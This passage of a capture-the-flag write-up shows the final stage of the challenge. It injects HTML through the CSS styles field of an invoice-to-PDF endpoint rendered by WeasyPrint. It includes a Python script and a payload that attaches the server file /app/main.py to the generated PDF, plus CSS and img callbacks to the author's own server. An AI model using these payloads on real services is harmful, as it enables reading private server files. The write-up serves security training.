curl -gv 'http://localhost:81/invoices/pdfize?d={"companyName":"Hackerone","email":"aaa@hackerone.com","invoiceNumber":"1","date":"2019-03-08","items":[["1","manoelt","manoelt","22222","2"],["1","manoelt","manoelt","2"],["1","manoelt","manoelt","2"]],"styles":{"body":{"background-color":"white"}}}' -o invoice.pdf; echo;
```

One of the first things that I try when attacking a python web application is Server Side Template Injection. Although we have several input options on the json above, none gave me a SSTI using `{{7*7}}` as payload. Also, what catches our attention is the permission to define styles for the web page, as we already know that using css we could leak information of a web page [17], but it does not seem to be useful here. But we could get some more recon information if we were able to trigger a HTTP request using `url()`: 

`..."styles":{"body":{"background-image":"url('http://myserver.com.br/')"...`. 

And I got a request on my server with this header: `User-Agent: WeasyPrint 44 (http://weasyprint.org/)`.

### WeasyPrint

What is WeasyPrint? From https://github.com/Kozea/WeasyPrint/ : _WeasyPrint is a smart solution helping web developers to create PDF documents. It turns simple HTML pages into gorgeous statistical reports, invoices, tickets…_. Ok, time to understand more this python library. 

Reading the docs I saw this: _When used with untrusted HTML or untrusted CSS, WeasyPrint can meet security problems. You will need extra configuration in your Python application to avoid high memory use, endless renderings or local files leaks._. Nice! All we need to know now is how to exploit this flaw. Maybe someone opened an issue on github? It was not the case. But, I found this pull request:

"Added support for PDF attachments." (https://github.com/Kozea/WeasyPrint/pull/177).

What an amazing feature! So, using `<link rel='attachment' href='file_path'>` WeasyPrint will attach the file from href location to the PDF. I am sure that it is all we need.

Let's test all json attributes to inject HTML code. Nothing better than creating a python script to help us:

```python
...
URL = 'http://localhost:81/invoices/'
...
def pdfize(payl, filename):
    r = requests.get(URL+PDFIZE, params=payload)
    with open('invoices/'+filename, 'wb') as fd:
        for chunk in r.iter_content(chunk_size=128):
            fd.write(chunk)

def preview(payl):
    r = requests.get(URL+PREVIEW, params=payload)
    print(r.content)

invoice = {"companyName":"</style", "email":"</style", "invoiceNumber":"1", "date":"<html", "<":">", "items":[["1","manoelt<script","manoelt</script","2"],["1","manoelt","manoelt","2"]],"styles":{"body":{"}</style background-color":"white"}}}
payload = {"d" : json.dumps(invoice)}
pdfize(payload, "style_invoice.pdf")
preview(payload)
```

And through only one attribute I was able to inject HTML: CSS property! But the backend was not allowing `</*>`... And this tip from [18]: `You can use // to close a tag instead of >.` made the final exploit:

```python

invoice = {"companyName":"", "email":"", "invoiceNumber":"1", "date":"html", "<":">", "items":[["1","manoelt","manoelt","2"],["1","manoelt","manoelt","2"]],"styles":{"body":{"}</style//<img src='http://mydomain.com.br'><link rel='attachment' href='file:///app/main.py'><style> body: {  background-color":"white"}}}
payload = {"d" : json.dumps(invoice)}
pdfize(payload, "style_invoice.pdf")
```

Finally I opened the PDF and there it was:

![Leak](images/leak_file.png)

```CONGRATULATIONS!

If you're reading this, you've made it to the end of the road for this CTF.
```

HERE IT IS: c8889970d9fb722066f31e804e351993


Check [Others](Others.md) for reports from other players.

### References
1. https://crackstation.net/hashing-security.htm
2. https://crypto.stanford.edu/~dabo/papers/ssl-timing.pdf
3. https://github.com/skylot/jadx
4. https://en.wikipedia.org/wiki/Symmetric-key_algorithm
5. https://en.wikipedia.org/wiki/Binary_search_algorithm
6. https://www.tcpdump.org/
7. https://github.com/maurosoria/dirsearch
8. https://github.com/danielmiessler/SecLists
9. https://github.com/sqlmapproject/sqlmap
10. https://en.wikipedia.org/wiki/Length_extension_attack
11. https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks
12. https://github.com/ffuf/ffuf
13. https://github.com/digininja/CeWL
14. https://www.python.org/dev/peps/pep-0515/
15. https://github.com/PortSwigger/turbo-intruder
16. https://github.com/noraj/flask-session-cookie-manager
17. https://www.mike-gualtieri.com/posts/stealing-data-with-css-attack-and-defense
18. https://github.com/s0md3v/AwesomeXSS
